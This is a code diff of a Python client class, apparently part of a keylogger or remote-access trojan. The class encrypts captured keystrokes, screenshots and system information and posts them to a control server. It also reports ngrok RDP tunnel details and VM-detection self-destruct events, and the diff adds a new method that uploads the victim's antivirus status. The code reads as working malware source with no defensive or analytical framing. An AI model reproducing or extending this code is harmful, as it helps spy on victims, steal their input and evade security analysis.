@@ -8,7 +8,6 @@ import gzip
 import base64
 from config import Config
 
-# Configure logging based on DEBUG_MODE
 if Config.DEBUG_MODE:
     logging.basicConfig(
         level=logging.INFO,
@@ -51,53 +50,41 @@ class ServerCommunicator:
             raise CommunicationError(f"Connection error: {str(e)}")
 
     def report_rdp_tunnel(self, tunnel_info: Dict) -> Dict:
-        """Report ngrok tunnel information to the server."""
         try:
             if Config.DEBUG_MODE:
                 logging.info(f"Preparing RDP tunnel report: client_id={self.client_id}")
-
             tunnel_info_json = json.dumps(tunnel_info, ensure_ascii=False)
             encrypted_tunnel_info = self.encryption.encrypt(tunnel_info_json)
-
             encrypted_data = {
                 "action": "report_rdp_tunnel",
                 "client_id": self.client_id,
                 "token": self.token,
                 "tunnel_info": encrypted_tunnel_info
             }
-
             if Config.DEBUG_MODE:
                 logging.info(f"Sending RDP tunnel report: {encrypted_data}")
-
             response = requests.post(
                 self.server_url,
                 data=encrypted_data,
                 timeout=Config.COMMAND_TIMEOUT,
                 verify=False
             )
-
             if response.status_code != 200:
                 if Config.DEBUG_MODE:
                     logging.error(f"RDP tunnel report failed: status={response.status_code}, response={response.text}")
                 raise CommunicationError(f"RDP tunnel report failed: {response.text}")
-
             if Config.DEBUG_MODE:
                 logging.info("RDP tunnel report sent successfully")
             return response.json()
-
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"RDP tunnel report error: {str(e)}")
             raise CommunicationError(f"RDP tunnel report error: {str(e)}")
 
     def report_update(self, new_version: str) -> Dict:
-        """
-        گزارش به‌روزرسانی به سرور.
-        """
         try:
             if Config.DEBUG_MODE:
                 logging.info(f"Preparing update report: client_id={self.client_id}, new_version={new_version}")
-
             report_data = {
                 "message": f"Updated to version {new_version}",
                 "client_id": self.client_id,
@@ -105,33 +92,27 @@ class ServerCommunicator:
                 "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
             }
             encrypted_report = self.encryption.encrypt(json.dumps(report_data, ensure_ascii=False))
-
             encrypted_data = {
                 "action": "report_update",
                 "client_id": self.client_id,
                 "token": self.token,
                 "report": encrypted_report
             }
-
             if Config.DEBUG_MODE:
                 logging.info(f"Sending update report: {encrypted_data}")
-
             response = requests.post(
                 self.server_url,
                 data=encrypted_data,
                 timeout=Config.COMMAND_TIMEOUT,
                 verify=False
             )
-
             if response.status_code != 200:
                 if Config.DEBUG_MODE:
                     logging.error(f"Update report failed: status={response.status_code}, response={response.text}")
                 raise CommunicationError(f"Update report failed: {response.text}")
-
             if Config.DEBUG_MODE:
                 logging.info("Update report sent successfully")
             return response.json()
-
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"Update report error: {str(e)}")
@@ -141,82 +122,100 @@ class ServerCommunicator:
         try:
             if Config.DEBUG_MODE:
                 logging.info(f"Preparing VM status upload: client_id={self.client_id}")
-
             vm_details_json = json.dumps(vm_details, ensure_ascii=False)
             encrypted_vm_details = self.encryption.encrypt(vm_details_json)
-
             encrypted_data = {
                 "action": "upload_vm_status",
                 "client_id": self.client_id,
                 "token": self.token,
                 "vm_details": encrypted_vm_details
             }
-
             if Config.DEBUG_MODE:
                 logging.info(f"Sending upload_vm_status: {encrypted_data}")
-
             response = requests.post(
                 self.server_url,
                 data=encrypted_data,
                 timeout=Config.COMMAND_TIMEOUT,
                 verify=False
             )
-
             if response.status_code != 200:
                 if Config.DEBUG_MODE:
                     logging.error(f"VM status upload failed: status={response.status_code}, response={response.text}")
                 raise CommunicationError(f"VM status upload failed: {response.text}")
-
             if Config.DEBUG_MODE:
                 logging.info("VM status upload successful")
             return response.json()
-
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"VM status upload error: {str(e)}")
             raise CommunicationError(f"VM status upload error: {str(e)}")
 
-    def report_self_destruct(self) -> Dict:
+    def upload_antivirus_status(self, av_details: Dict) -> Dict:
         """
-        گزارش حذف خودکار به سرور قبل از خاتمه.
+        ارسال وضعیت آنتی‌ویروس به سرور
         """
         try:
             if Config.DEBUG_MODE:
-                logging.info(f"Preparing self-destruct report: client_id={self.client_id}")
+                logging.info(f"Preparing antivirus status upload: client_id={self.client_id}")
+            av_details_json = json.dumps(av_details, ensure_ascii=False)
+            encrypted_av_details = self.encryption.encrypt(av_details_json)
+            encrypted_data = {
+                "action": "upload_antivirus_status",
+                "client_id": self.client_id,
+                "token": self.token,
+                "av_details": encrypted_av_details
+            }
+            if Config.DEBUG_MODE:
+                logging.info(f"Sending antivirus status: {encrypted_data}")
+            response = requests.post(
+                self.server_url,
+                data=encrypted_data,
+                timeout=Config.COMMAND_TIMEOUT,
+                verify=False
+            )
+            if response.status_code != 200:
+                if Config.DEBUG_MODE:
+                    logging.error(f"Antivirus status upload failed: status={response.status_code}, response={response.text}")
+                raise CommunicationError(f"Antivirus status upload failed: {response.text}")
+            if Config.DEBUG_MODE:
+                logging.info("Antivirus status upload successful")
+            return response.json()
+        except Exception as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"Antivirus status upload error: {str(e)}")
+            raise CommunicationError(f"Antivirus status upload error: {str(e)}")
 
+    def report_self_destruct(self) -> Dict:
+        try:
+            if Config.DEBUG_MODE:
+                logging.info(f"Preparing self-destruct report: client_id={self.client_id}")
             report_data = {
                 "message": "Self-destruct initiated due to VM detection",
                 "client_id": self.client_id,
                 "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
             }
             encrypted_report = self.encryption.encrypt(json.dumps(report_data, ensure_ascii=False))
-
             encrypted_data = {
                 "action": "report_self_destruct",
                 "client_id": self.client_id,
                 "token": self.token,
                 "report": encrypted_report
             }
-
             if Config.DEBUG_MODE:
                 logging.info(f"Sending self-destruct report: {encrypted_data}")
-
             response = requests.post(
                 self.server_url,
                 data=encrypted_data,
                 timeout=Config.COMMAND_TIMEOUT,
                 verify=False
             )
-
             if response.status_code != 200:
                 if Config.DEBUG_MODE:
                     logging.error(f"Self-destruct report failed: status={response.status_code}, response={response.text}")
                 raise CommunicationError(f"Self-destruct report failed: {response.text}")
-
             if Config.DEBUG_MODE:
                 logging.info("Self-destruct report sent successfully")
             return response.json()
-
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"Self-destruct report error: {str(e)}")
@@ -256,13 +255,10 @@ class ServerCommunicator:
                 if Config.DEBUG_MODE:
                     logging.warning("System_info is empty or not a dict")
                 system_info = {'error': 'No system info provided'}
-
             keystrokes_str = ' '.join(str(k) for k in keystrokes if k)
             system_info_json = json.dumps(system_info, ensure_ascii=False)
-
             if Config.DEBUG_MODE:
                 logging.info(f"Preparing upload: client_id={self.client_id}, keystrokes_len={len(keystrokes_str)}, system_info_len={len(system_info_json)}")
-
             try:
                 encrypted_keystrokes = self.encryption.encrypt(keystrokes_str)
                 encrypted_system_info = self.encryption.encrypt(system_info_json)
@@ -270,12 +266,10 @@ class ServerCommunicator:
                 if Config.DEBUG_MODE:
                     logging.error(f"Encryption failed: {str(e)}")
                 raise CommunicationError(f"Encryption failed: {str(e)}")
-
             if not encrypted_keystrokes or not encrypted_system_info:
                 if Config.DEBUG_MODE:
                     logging.error("Encryption produced empty output")
                 raise CommunicationError("Encryption produced empty output")
-
             encrypted_data = {
                 "action": "upload_data",
                 "client_id": self.client_id,
@@ -283,13 +277,11 @@ class ServerCommunicator:
                 "keystrokes": encrypted_keystrokes,
                 "system_info": encrypted_system_info
             }
-
             files = {}
             if screenshot:
                 files['screenshot'] = ('screenshot.png', screenshot, 'image/png')
                 if Config.DEBUG_MODE:
                     logging.info("Including screenshot in upload")
-
             response = requests.post(
                 self.server_url,
                 data=encrypted_data,
@@ -297,16 +289,13 @@ class ServerCommunicator:
                 timeout=Config.COMMAND_TIMEOUT,
                 verify=False
             )
-
             if response.status_code != 200:
                 if Config.DEBUG_MODE:
                     logging.error(f"Upload failed: status={response.status_code}, response={response.text}")
                 raise CommunicationError(f"Upload failed: {response.text}")
-
             if Config.DEBUG_MODE:
                 logging.info("Upload successful")
             return response.json()
-
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"Upload error: {str(e)}")
